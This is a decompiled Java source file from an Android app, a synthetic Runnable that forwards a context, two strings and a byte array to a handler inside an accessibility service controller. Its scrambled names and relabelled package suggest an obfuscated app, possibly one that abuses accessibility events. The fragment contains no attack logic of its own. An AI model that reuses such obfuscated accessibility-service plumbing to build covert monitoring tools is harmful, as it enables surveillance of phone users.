/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Context
 */
package linker.resourcer.encoder;

import android.content.Context;
import linker.resourcer.encoder.AccessibilityServiceController;

public final class AccessibilityServiceController$$ExternalSyntheticLambda13
implements Runnable {
    public final AccessibilityServiceController f$0;
    public final Context f$1;
    public final String f$2;
    public final String f$3;
    public final byte[] f$4;

    public /* synthetic */ AccessibilityServiceController$$ExternalSyntheticLambda13(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2, Context context, String string2, String string3, byte[] byArray) {
        this.f$0 = jhvbzpdwpbqgticwdxuva2;
        this.f$1 = context;
        this.f$2 = string2;
        this.f$3 = string3;
        this.f$4 = byArray;
    }

    @Override
    public final void run() {
        this.f$0.lambda$onAccessibilityEvent$19$com-icontrol-protector-AccessibilityServiceController(this.f$1, this.f$2, this.f$3, this.f$4);
    }
}

